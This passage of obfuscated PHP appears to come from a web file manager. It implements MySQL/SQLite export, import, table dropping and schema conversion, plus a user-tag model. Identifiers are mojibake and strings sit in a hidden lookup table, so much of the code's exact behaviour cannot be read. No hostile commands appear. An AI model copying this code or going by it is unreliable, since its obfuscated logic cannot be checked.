$Ã—ğÒ½Š[$_SERVER[”ôÑ§ì¸][94]] == $_SERVER[”ôÑ§ì¸][801]) { continue; } } } if ($®¯ä×ï€) { $Ã—ğÒ½Š[$_SERVER[”ôÑ§ì¸][84]] = "\x7b\x69\x6f\x3a{$®¯ä×ï€}\x7d" . substr($Ã—ğÒ½Š[$_SERVER[”ôÑ§ì¸][84]], strlen("\173\151\157\72{$Ã—ğÒ½Š[$_SERVER[”ôÑ§ì¸][839]]}\x7d")); $Ã—ğÒ½Š[$_SERVER[”ôÑ§ì¸][839]] = $®¯ä×ï€; } $ñÁÜªß§[] = $_SERVER[”ôÑ§ì¸][1103] . $this->sqlEncode($Ã—ğÒ½Š) . $_SERVER[”ôÑ§ì¸][1104]; } $Ø´é«…Ÿ = "\111\x4e\x53\x45\122\124\40\x49\116\124\x4f\x20\x60{$°ô¯Ôá}\140\40\50\140" . implode($_SERVER[”ôÑ§ì¸][1105], $¨ˆ¶Ÿ‡Ä) . $_SERVER[”ôÑ§ì¸][1106]; fwrite($óóõï„Ş, $Ø´é«…Ÿ . implode($_SERVER[”ôÑ§ì¸][1107], $ñÁÜªß§) . $_SERVER[”ôÑ§ì¸][71] . PHP_EOL); $ïÏÕœ–´ += $õšÖ¿Š¡; if ($¤˜¬°Ìê) { $¤˜¬°Ìê->update($õšÖ¿Š¡); } } while ($İé¢‰†É == $õšÖ¿Š¡); fclose($óóõï„Ş); return $ïÏÕœ–´; } public function sqlToDb($¥ÏôŠæÑ, &$áô¬×) { $·ºÑ¡â‚ =& $_SERVER[”ôÑ§ì¸]; $”×šêö± = $this->model()->db(); $‰ü¸Œ„˜ = @fopen($¥ÏôŠæÑ, $·ºÑ¡â‚[1108]); if (!$‰ü¸Œ„˜) { return !1; } $¯ı¾ª»– = 0; $²º å›¹ = $·ºÑ¡â‚[12]; $æšËò…Ü = array(); $…±¾û© = $this->dbType(); $íšß¿®õ = $…±¾û© == $·ºÑ¡â‚[13] ? 500 : 2000; $¤µéŞ€Ş = basename($¥ÏôŠæÑ, $·ºÑ¡â‚[810]); $»€¤ı©á = 0; $Ò´°‹Ï‹ = 4194304 - 104858; $ÙÆˆÚ¿Ó = 1000000 - 104858; while (!feof($‰ü¸Œ„˜)) { $’Èí¯¹ï = trim(fgets($‰ü¸Œ„˜)); if (!$’Èí¯¹ï) { continue; } $”ÂÇˆ±Ÿ = $this->sqlDecode($’Èí¯¹ï, $…±¾û©, $¤µéŞ€Ş); if (stripos($”ÂÇˆ±Ÿ, $·ºÑ¡â‚[398]) === 0) { if (!$²º å›¹) { $²º å›¹ = $”ÂÇˆ±Ÿ . $·ºÑ¡â‚[53]; } continue; } if ($áô¬×) { $áô¬×->task[$·ºÑ¡â‚[808]] += 1; } $¯ı¾ª»–++; $æšËò…Ü[] = rtrim(rtrim(trim($”ÂÇˆ±Ÿ), $·ºÑ¡â‚[50]), $·ºÑ¡â‚[71]); $í²Ÿ†‚¼ = null; $­ãüÑï† = strlen($”ÂÇˆ±Ÿ); $»€¤ı©á += $­ãüÑï†; if ($»€¤ı©á >= ($íšß¿®õ == 500 ? $ÙÆˆÚ¿Ó : $Ò´°‹Ï‹)) { $í²Ÿ†‚¼ = array_pop($æšËò…Ü); if ($¯ı¾ª»– > 1) { $¯ı¾ª»–--; } } if ($¯ı¾ª»– >= $íšß¿®õ || $í²Ÿ†‚¼) { $”ÂÇˆ±Ÿ = $²º å›¹ . implode($·ºÑ¡â‚[50], $æšËò…Ü); if (!$”×šêö±->execute($”ÂÇˆ±Ÿ)) { return !1; } if ($áô¬×) { $áô¬×->update($¯ı¾ª»–); } $æšËò…Ü = array(); $¯ı¾ª»– = 0; $»€¤ı©á = 0; if ($í²Ÿ†‚¼) { $æšËò…Ü = array($í²Ÿ†‚¼); $¯ı¾ª»– = 1; $»€¤ı©á = $­ãüÑï†; } } } fclose($‰ü¸Œ„˜); if (!empty($æšËò…Ü)) { $”ÂÇˆ±Ÿ = $²º å›¹ . implode($·ºÑ¡â‚[50], $æšËò…Ü); if (!$”×šêö±->execute($”ÂÇˆ±Ÿ)) { return !1; } if ($áô¬×) { $áô¬×->update($¯ı¾ª»–); } } return !0; } public function dropTable($¤¥Š¨·Ô = null) { $ğëÄÔŠğ = $this->model()->db(); $¦§¨Ÿé± = $¤¥Š¨·Ô ? array($¤¥Š¨·Ô) : $ğëÄÔŠğ->getTables(); if (!$¦§¨Ÿé±) { return; } foreach ($¦§¨Ÿé± as $¤¥Š¨·Ô) { if ($¤¥Š¨·Ô) { $¤¥Š¨·Ô = strtolower($¤¥Š¨·Ô); } else { continue; } $ğëÄÔŠğ->execute("\144\x72\157\x70\40\x74\x61\142\154\x65\x20\151\x66\x20\145\x78\x69\x73\164\163\40\140{$¤¥Š¨·Ô}\140"); } } private function sqlEncode($Òõ¸Ş¬) { $†³İ•Şà =& $_SERVER[”ôÑ§ì¸]; $Â¹äÌ³ = array(); foreach ($Òõ¸Ş¬ as $ûÏòçé®) { if (is_array($ûÏòçé®)) { $ûÏòçé® = json_encode_force($ûÏòçé®); } $ûÏòçé® = addslashes($ûÏòçé®); $ûÏòçé® = str_replace(array($†³İ•Şà[1109], $†³İ•Şà[245]), array($†³İ•Şà[1110], $†³İ•Şà[1111]), $ûÏòçé®); $Â¹äÌ³[] = str_replace($†³İ•Şà[58], $†³İ•Şà[1112], $ûÏòçé®); } return $†³İ•Şà[58] . implode($†³İ•Şà[1113], $Â¹äÌ³) . $†³İ•Şà[58]; } private function sqlDecode($×Ï¸±èà, $Î¶œÓ¡¥, $–¾Ö¼Ø = '') { $ §èí¬æ =& $_SERVER[”ôÑ§ì¸]; $×Ï¸±èà = str_replace(array($ §èí¬æ[1110], $ §èí¬æ[1111]), array($ §èí¬æ[1109], $ §èí¬æ[245]), $×Ï¸±èà); if ($Î¶œÓ¡¥ == $ §èí¬æ[13]) { return $–¾Ö¼Ø != $ §èí¬æ[1114] ? stripslashes($×Ï¸±èà) : $×Ï¸±èà; } if ($–¾Ö¼Ø == $ §èí¬æ[1114]) { $×Ï¸±èà = str_replace($ §èí¬æ[1115], $ §èí¬æ[118], stripslashes($×Ï¸±èà)); } return $×Ï¸±èà; } public function getSqlFile($”¦Õ‰Ò = '') { $ñÑñŞõ– =& $_SERVER[”ôÑ§ì¸]; $ñËí‚Ä¦ = $this->dbType(!0); $îü‡¬”¦ = CONTROLLER_DIR . "\151\x6e\x73\x74\x61\154\x6c\57\144\x61\164\x61\57{$ñËí‚Ä¦}\56\163\x71\x6c"; $ËÛ³ıæ = file_get_contents($îü‡¬”¦); $Íæ½ŸÕ = $ñÑñŞõ–[1116] . ($ñËí‚Ä¦ == $ñÑñŞõ–[826] ? $ñÑñŞõ–[1117] : $ñÑñŞõ–[1118]) . $ñÑñŞõ–[1119]; preg_match_all($Íæ½ŸÕ, $ËÛ³ıæ, $¶¸ôø±ç); $Â±±øğŞ = $¶¸ôø±ç[1]; $Ûˆğ–ç = $this->model()->db(); $àãÄşòÃ = $Ûˆğ–ç->getTables(); $›œÜˆ°Í = TEMP_FILES . $ñÑñŞõ–[1120] . date($ñÑñŞõ–[254]) . $ñÑñŞõ–[8]; del_dir($›œÜˆ°Í); mk_dir($›œÜˆ°Í); $÷¶­‰Æô = $›œÜˆ°Í . $ñÑñŞõ–[1121]; $‘ÌÕ×§È = $›œÜˆ°Í . $ñÑñŞõ–[1122]; $×²ÍÁñ = $ñËí‚Ä¦ == $ñÑñŞõ–[13] ? $ñÑñŞõ–[826] : $ñÑñŞõ–[13]; IO::copy(CONTROLLER_DIR . "\151\x6e\x73\x74\x61\x6c\154\x2f\144\141\164\x61\x2f{$×²ÍÁñ}\x2e\163\x71\x6c", $›œÜˆ°Í); @touch($›œÜˆ°Í . $ñËí‚Ä¦ . $ñÑñŞõ–[810]); $Ò¸ìª¯¬ = fopen($÷¶­‰Æô, $ñÑñŞõ–[1097]); $”¬Ó» = fopen($‘ÌÕ×§È, $ñÑñŞõ–[1097]); if ($ñËí‚Ä¦ == $ñÑñŞõ–[13]) { $àãÄşòÃ = array_diff($àãÄşòÃ, array($ñÑñŞõ–[806], $ñÑñŞõ–[807])); $’ğ‰ïÃÒ = array($ñÑñŞõ–[1123], $ñÑñŞõ–[1124], $ñÑñŞõ–[1125]); fwrite($”¬Ó», implode(PHP_EOL, $’ğ‰ïÃÒ) . PHP_EOL . PHP_EOL); foreach ($àãÄşòÃ as $öôÕÄã‡) { $¾È´ğÉ« = $this->sqlFromSqlite($öôÕÄã‡); if (!$¾È´ğÉ«[$ñÑñŞõ–[13]]) { continue; } fwrite($”¬Ó», $¾È´ğÉ«[$ñÑñŞõ–[13]] . PHP_EOL . PHP_EOL); if (!in_array($öôÕÄã‡, $Â±±øğŞ)) { fwrite($Ò¸ìª¯¬, $¾È´ğÉ«[$ñÑñŞõ–[826]] . PHP_EOL . PHP_EOL); } } } else { foreach ($àãÄşòÃ as $öôÕÄã‡) { $¾È´ğÉ« = $this->sqlFromMysql($öôÕÄã‡); if (!$¾È´ğÉ«[$ñÑñŞõ–[826]]) { continue; } fwrite($Ò¸ìª¯¬, $¾È´ğÉ«[$ñÑñŞõ–[826]] . PHP_EOL . PHP_EOL); if (!in_array($öôÕÄã‡, $Â±±øğŞ)) { fwrite($”¬Ó», $¾È´ğÉ«[$ñÑñŞõ–[13]] . PHP_EOL . PHP_EOL); } } } fclose($Ò¸ìª¯¬); fclose($”¬Ó»); $ËÛ³ıæ = array($ñÑñŞõ–[826] => $÷¶­‰Æô, $ñÑñŞõ–[13] => $‘ÌÕ×§È); return $”¦Õ‰Ò ? $ËÛ³ıæ[$”¦Õ‰Ò] : $ËÛ³ıæ; } public function dbType($‡–²Ã¦­ = false) { $Ç”šîÃ =& $_SERVER[”ôÑ§ì¸]; $Ô‘ÌÆßÃ = $‡–²Ã¦­ ? $GLOBALS[$Ç”šîÃ[6]][$Ç”šîÃ[21]] : $this->database; $Ô‘ÌÆßÃ = array_change_key_case($Ô‘ÌÆßÃ); $„¿˜ÁóÃ = $Ô‘ÌÆßÃ[$Ç”šîÃ[998]]; if ($„¿˜ÁóÃ == $Ç”šîÃ[995]) { $™×ëˆ¢ï = explode($Ç”šîÃ[4], $Ô‘ÌÆßÃ[$Ç”šîÃ[1004]]); $„¿˜ÁóÃ = $™×ëˆ¢ï[0]; } $®Ç§¡ùç = array($Ç”šîÃ[1126] => $Ç”šîÃ[13], $Ç”šîÃ[943] => $Ç”šîÃ[826]); if (isset($®Ç§¡ùç[$„¿˜ÁóÃ])) { $„¿˜ÁóÃ = $®Ç§¡ùç[$„¿˜ÁóÃ]; } return $„¿˜ÁóÃ; } public function sqlFromMysql($Ï¸¤Æ¦Á, $¥¶´ı = '') { $Ï®àÕŠÈ =& $_SERVER[”ôÑ§ì¸]; $Ûº„ò©” = $this->model()->db(); $—ë Ñ” = $Ûº„ò©”->query($Ï®àÕŠÈ[1127] . $Ï¸¤Æ¦Á . $Ï®àÕŠÈ[428]); if (!$—ë Ñ” || !$—ë Ñ”[0]) { return !1; } $·¤Ÿ×„¶ = _get($—ë Ñ”[0], $Ï®àÕŠÈ[1128], $Ï®àÕŠÈ[12]); if (!$·¤Ÿ×„¶) { return !1; } $£ë¬¶îÜ = "\104\122\117\120\40\124\101\102\114\x45\x20\x49\106\40\105\x58\111\123\x54\x53\40\140{$Ï¸¤Æ¦Á}\140\x3b" . PHP_EOL . $·¤Ÿ×„¶ . $Ï®àÕŠÈ[71]; if ($¥¶´ı && $¥¶´ı == $Ï®àÕŠÈ[826]) { return $£ë¬¶îÜ; } $é¡Ùí¸· = array_change_key_case($GLOBALS[$Ï®àÕŠÈ[6]][$Ï®àÕŠÈ[21]]); $úÂ­˜ó = $é¡Ùí¸·[$Ï®àÕŠÈ[1003]]; $÷Œˆ„€ù = $Ï®àÕŠÈ[1129] . $úÂ­˜ó . $Ï®àÕŠÈ[1130] . $Ï¸¤Æ¦Á . $Ï®àÕŠÈ[58]; $ §¢¸†à = $Ï®àÕŠÈ[1131] . $Ï¸¤Æ¦Á . $Ï®àÕŠÈ[931]; $©ùªŒ… = $Ûº„ò©”->query($÷Œˆ„€ù); if (empty($©ùªŒ…)) { $¸Ã€­ÀÄ = array($Ï®àÕŠÈ[826] => $Ï®àÕŠÈ[12], $Ï®àÕŠÈ[13] => $Ï®àÕŠÈ[12]); return $¥¶´ı ? $¸Ã€­ÀÄ[$¥¶´ı] : $¸Ã€­ÀÄ; } $ÊôáóŸ¿ = $Ûº„ò©”->query($ §¢¸†à); $Ã¿Š¯ÒÛ = $Ï®àÕŠÈ[12]; $ªÙ¿ŠÇ = array(); foreach ($ÊôáóŸ¿ as $…¼€ğÕ) { if (!$Ã¿Š¯ÒÛ && $…¼€ğÕ[$Ï®àÕŠÈ[1132]] == $Ï®àÕŠÈ[1133]) { $Ã¿Š¯ÒÛ = $…¼€ğÕ[$Ï®àÕŠÈ[1134]]; } if (isset($ªÙ¿ŠÇ[$…¼€ğÕ[$Ï®àÕŠÈ[1132]]])) { $ªÙ¿ŠÇ[$…¼€ğÕ[$Ï®àÕŠÈ[1132]]][$Ï®àÕŠÈ[1135]][] = $…¼€ğÕ[$Ï®àÕŠÈ[1134]]; continue; } $ªÙ¿ŠÇ[$…¼€ğÕ[$Ï®àÕŠÈ[1132]]] = array($Ï®àÕŠÈ[1136] => $…¼€ğÕ[$Ï®àÕŠÈ[1132]], $Ï®àÕŠÈ[1135] => array($…¼€ğÕ[$Ï®àÕŠÈ[1134]]), $Ï®àÕŠÈ[1137] => $…¼€ğÕ[$Ï®àÕŠÈ[1138]] == $Ï®àÕŠÈ[88] ? 0 : 1); } $§åñ¢Ï‡ = array(); foreach ($ªÙ¿ŠÇ as $…¼€ğÕ) { $˜ŒµÇòì = $…¼€ğÕ[$Ï®àÕŠÈ[1136]] == $Ï®àÕŠÈ[1133]; $Æ“º®ƒÇ = array($Ï®àÕŠÈ[1139], $…¼€ğÕ[$Ï®àÕŠÈ[1137]] == $Ï®àÕŠÈ[88] && !$˜ŒµÇòì ? $Ï®àÕŠÈ[1140] : $Ï®àÕŠÈ[12], $Ï®àÕŠÈ[1141], $Ï®àÕŠÈ[1142] . $Ï¸¤Æ¦Á . $Ï®àÕŠÈ[11] . ($˜ŒµÇòì ? $Ï®àÕŠÈ[1143] : $…¼€ğÕ[$Ï®àÕŠÈ[1136]]) . $Ï®àÕŠÈ[118], $Ï®àÕŠÈ[1144], $Ï®àÕŠÈ[118] . $Ï¸¤Æ¦Á . $Ï®àÕŠÈ[118], $Ï®àÕŠÈ[1145] . implode($Ï®àÕŠÈ[1146], $…¼€ğÕ[$Ï®àÕŠÈ[1135]]) . $Ï®àÕŠÈ[1147]); $§åñ¢Ï‡[] = implode($Ï®àÕŠÈ[53], $Æ“º®ƒÇ) . $Ï®àÕŠÈ[71]; } $³ÓŒ‘Ñ¼ = array(); $»Ë±Û±ì = array($Ï®àÕŠÈ[1148] => $Ï®àÕŠÈ[1149], $Ï®àÕŠÈ[1149] => $Ï®àÕŠÈ[1149], $Ï®àÕŠÈ[331] => $Ï®àÕŠÈ[358], $Ï®àÕŠÈ[330] => $Ï®àÕŠÈ[358]); foreach ($©ùªŒ… as $…¼€ğÕ) { $Æ“º®ƒÇ = array($Ï®àÕŠÈ[118] . $…¼€ğÕ[$Ï®àÕŠÈ[1150]] . $Ï®àÕŠÈ[118], isset($»Ë±Û±ì[$…¼€ğÕ[$Ï®àÕŠÈ[1151]]]) ? $»Ë±Û±ì[$…¼€ğÕ[$Ï®àÕŠÈ[1151]]] : $…¼€ğÕ[$Ï®àÕŠÈ[1152]], $…¼€ğÕ[$Ï®àÕŠÈ[1153]] == $Ï®àÕŠÈ[929] ? $Ï®àÕŠÈ[1154] : $Ï®àÕŠÈ[1155], $…¼€ğÕ[$Ï®àÕŠÈ[1150]] == $Ã¿Š¯ÒÛ ? $Ï®àÕŠÈ[1156] : $Ï®àÕŠÈ[12], $…¼€ğÕ[$Ï®àÕŠÈ[980]] ? strtoupper(str_replace($Ï®àÕŠÈ[11], $Ï®àÕŠÈ[12], $…¼€ğÕ[$Ï®àÕŠÈ[980]])) : $Ï®àÕŠÈ[12]); $³ÓŒ‘Ñ¼[] = trim(implode($Ï®àÕŠÈ[53], $Æ“º®ƒÇ)); } $é•áÃÎ‰ = array($Ï®àÕŠÈ[1157] . $Ï¸¤Æ¦Á . $Ï®àÕŠÈ[1158], $Ï®àÕŠÈ[1159] . $Ï¸¤Æ¦Á . $Ï®àÕŠÈ[1160], implode($Ï®àÕŠÈ[50] . PHP_EOL, $³ÓŒ‘Ñ¼), $Ï®àÕŠÈ[977]); $ ¾ÉŞÜğ = implode(PHP_EOL, array_merge($é•áÃÎ‰, $§åñ¢Ï‡)); if ($¥¶´ı && $¥¶´ı == $Ï®àÕŠÈ[13]) { return $ ¾ÉŞÜğ; } $¸Ã€­ÀÄ = array($Ï®àÕŠÈ[826] => $£ë¬¶îÜ, $Ï®àÕŠÈ[13] => $ ¾ÉŞÜğ); return $¥¶´ı ? $¸Ã€­ÀÄ[$¥¶´ı] : $¸Ã€­ÀÄ; } public function sqlFromSqlite($Îªòƒ¹, $óªªĞÃã = '') { $ú¨Óæî =& $_SERVER[”ôÑ§ì¸]; $Ù‹ä «õ = $this->model()->db(); $´¤Âü’ñ = "\x50\122\101\107\x4d\101\40\124\101\x42\114\x45\137\111\x4e\106\117\x20\50\x27{$Îªòƒ¹}\47\51"; $—ëœÔ° = "\x53\x45\x4c\105\103\x54\40\52\40\106\122\117\x4d\40\x73\x71\154\x69\164\145\137\155\141\x73\164\x65\x72\40\127\x48\105\x52\105\40\x74\142\x6c\x5f\x6e\x61\155\145\x20\75\x20\47{$Îªòƒ¹}\47"; $î÷®´îÓ = $Ù‹ä «õ->query($´¤Âü’ñ); if (empty($î÷®´îÓ)) { $Ô¯„ô = array($ú¨Óæî[826] => $ú¨Óæî[12], $ú¨Óæî[13] => $ú¨Óæî[12]); return $óªªĞÃã ? $Ô¯„ô[$óªªĞÃã] : $Ô¯„ô; } $˜¿ÉÛôÓ = $Ù‹ä «õ->query($—ëœÔ°); $ğÃÌŒû³ = $¾¬…ïª¤ = array(); foreach ($˜¿ÉÛôÓ as $ó£Î©Šë) { if ($ó£Î©Šë[$ú¨Óæî[33]] == $ú¨Óæî[322]) { $ğÃÌŒû³[] = $ó£Î©Šë[$ú¨Óæî[1161]]; } else { $¾¬…ïª¤[$ó£Î©Šë[$ú¨Óæî[32]]] = $ó£Î©Šë[$ú¨Óæî[1161]]; } } $îÁ’„™› = array_merge(array($ú¨Óæî[1157] . $Îªòƒ¹ . $ú¨Óæî[118]), $ğÃÌŒû³, array_values($¾¬…ïª¤)); $îÁ’„™› = implode($ú¨Óæî[71] . PHP_EOL, $îÁ’„™›) . $ú¨Óæî[71]; if ($óªªĞÃã && $óªªĞÃã == $ú¨Óæî[13]) { return $îÁ’„™›; } $°×ªêÊ€ = array(); $Ë¸¼•øı = array($ú¨Óæî[1149] => $ú¨Óæî[1162], $ú¨Óæî[358] => $ú¨Óæî[1163]); $õœœÄ²ï = $ú¨Óæî[12]; foreach ($î÷®´îÓ as $ó£Î©Šë) { if ($ó£Î©Šë[$ú¨Óæî[57]] == $ú¨Óæî[88]) { $õœœÄ²ï = $ó£Î©Šë[$ú¨Óæî[32]]; } $ı¡ú™°¡ = array($ú¨Óæî[428] . $ó£Î©Šë[$ú¨Óæî[32]] . $ú¨Óæî[428], isset($Ë¸¼•øı[$ó£Î©Šë[$ú¨Óæî[33]]]) ? $Ë¸¼•øı[$ó£Î©Šë[$ú¨Óæî[33]]] : $ó£Î©Šë[$ú¨Óæî[33]], $ó£Î©Šë[$ú¨Óæî[35]] == $ú¨Óæî[88] ? $ú¨Óæî[1154] : $ú¨Óæî[1164] . $ó£Î©Šë[$ú¨Óæî[56]], $ó£Î©Šë[$ú¨Óæî[57]] == $ú¨Óæî[88] ? $ú¨Óæî[1165] : $ú¨Óæî[12]); $°×ªêÊ€[] = trim(implode($ú¨Óæî[53], $ı¡ú™°¡)); } foreach ($¾¬…ïª¤ as $ŞÆ¨òØÆ => $•ùÍ¦ÑÔ) { $Êö‰³Ÿ§ = str_replace($ú¨Óæî[1166] . $Îªòƒ¹ . $ú¨Óæî[11], $ú¨Óæî[12], $ŞÆ¨òØÆ); $“ª¥ŞÉè = str_replace(array($ú¨Óæî[118], $ú¨Óæî[988]), $ú¨Óæî[428], substr($•ùÍ¦ÑÔ, stripos($•ùÍ¦ÑÔ, $ú¨Óæî[303]))); if ($Êö‰³Ÿ§ == $ú¨Óæî[1143]) { $ÌšÁÕìš = $ú¨Óæî[1167] . $õœœÄ²ï . $ú¨Óæî[1168]; } else { $ÌšÁÕìš = (stripos($Êö‰³Ÿ§, $ú¨Óæî[11]) ? $ú¨Óæî[1169] : $ú¨Óæî[12]) . ($ú¨Óæî[1170] . $Êö‰³Ÿ§ . $ú¨Óæî[1171] . $“ª¥ŞÉè); } $°×ªêÊ€[] = $ÌšÁÕìš; } $‹Ó­’âÅ = array($ú¨Óæî[1172] . $Îªòƒ¹ . $ú¨Óæî[1173], $ú¨Óæî[1174] . $Îªòƒ¹ . $ú¨Óæî[1175], implode($ú¨Óæî[50] . PHP_EOL, $°×ªêÊ€), $ú¨Óæî[1176]); $ú¸ı¼âó = implode(PHP_EOL, $‹Ó­’âÅ); if ($óªªĞÃã && $óªªĞÃã == $ú¨Óæî[826]) { return $ú¸ı¼âó; } $Ô¯„ô = array($ú¨Óæî[826] => $ú¸ı¼âó, $ú¨Óæî[13] => $îÁ’„™›); return $óªªĞÃã ? $Ô¯„ô[$óªªĞÃã] : $Ô¯„ô; } } goto dêßÉÚ—¬Ö; EñßƒóÌ°ô: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\162\137\x66\x61\x76"; protected function cacheFunctionAlias($­¬À¯üı) { $…“ºÂïä =& $_SERVER[”ôÑ§ì¸]; return array($…“ºÂïä[1977] => array($…“ºÂïä[2367] . USER_ID, $…“ºÂïä[1978])); } protected function listData() { $Í»–Ó˜¤ =& $_SERVER[”ôÑ§ì¸]; $ò’÷ä = array($Í»–Ó˜¤[1665] => USER_ID, $Í»–Ó˜¤[524] => array($Í»–Ó˜¤[1981], 0)); $Ñ¥”®Çš = $Í»–Ó˜¤[2368]; $ê¢‹¡‡ = $this->field($Ñ¥”®Çš)->where($ò’÷ä)->order($Í»–Ó˜¤[1984])->select(); return $ê¢‹¡‡ ? $ê¢‹¡‡ : array(); } protected function addToTag($±À—å±—, $Í¸””º—) { $œÒ€Ø =& $_SERVER[”ôÑ§ì¸]; if (!Model($œÒ€Ø[2126])->listData($Í¸””º—)) { return !1; } if (is_numeric($±À—å±—)) { $¸ñ½„õà = Model($œÒ€Ø[847])->pathInfo($±À—å±—); if (!$¸ñ½„õà) { return !1; } } else { $¸ñ½„õà = IO::infoSimple($±À—å±—); if (!$¸ñ½„õà) { return !1; } $÷´¶…ç¬ = $¸ñ½„õà[$œÒ€Ø[32]]; $ Âğ‰ÊÔ = $¸ñ½„õà[$œÒ€Ø[33]]; if (isset($¸ñ½„õà[$œÒ€Ø[452]])) { $ Âğ‰ÊÔ = $¸ñ½„õà[$œÒ€Ø[452]] == $œÒ€Ø[88] ? $œÒ€Ø[75] : $œÒ€Ø[213]; } } $â¦…Å™¯ = array($œÒ€Ø[1665] => USER_ID, $œÒ€Ø[524] => $Í¸””º—, $œÒ€Ø[462] => $±À—å±—, $œÒ€Ø[463] => $ Âğ‰ÊÔ ? $ Âğ‰ÊÔ : $œÒ€Ø[457], $œÒ€Ø[461] => $÷´¶…ç¬ ? $÷´¶…ç¬ : $œÒ€Ø[12], $œÒ€Ø[1870] => 0); if ($this->where($â¦…Å™¯)->find()) { return !1; } return $this->add($â¦…Å™¯); } protected function removeFromTag($§Øå§ö†, $²Ã÷ÒıÉ) { $ÌÚ°ÀÀã =& $_SERVER[”ôÑ§ì¸]; if (!Model($ÌÚ°ÀÀã[2126])->listData($²Ã÷ÒıÉ)) { return !1; } if (is_array($§Øå§ö†)) { $§Øå§ö† = array($ÌÚ°ÀÀã[7], $§Øå§ö†); } $íõ­Úİš = array($ÌÚ°ÀÀã[1665] => USER_ID, $ÌÚ°ÀÀã[524] => $²Ã÷ÒıÉ, $ÌÚ°ÀÀã[462] => $§Øå§ö†); return $this->where($íõ­Úİš)->delete(); } protected function removeByTag($ÎÂõãˆ) { $©¨ç¢Å¾ =& $_SERVER[”ôÑ§ì¸]; if (!$ÎÂõãˆ) { return !1; } $ÚıÒĞï¦ = array($©¨ç¢Å¾[1665] => USER_ID, $©¨ç¢Å¾[524] => $ÎÂõãˆ); return $this->where($ÚıÒĞï¦)->delete(); } protected function removeBySource($ËÀÙë‹Á) { $É·±›¤‘ =& $_SERVER[”ôÑ§ì¸]; if (is_array($ËÀÙë‹Á)) { $ËÀÙë‹Á = array($É·±›¤‘[7], $ËÀÙë‹Á); } $Ôª½´”ü = array($É·±›¤‘[1665] => USER_ID, $É·±›¤‘[524] => array($É·±›¤‘[1045], 0), $É·±›¤‘[462] => $ËÀÙë‹Á); return $this->where($Ôª½´”ü)->delete(); } }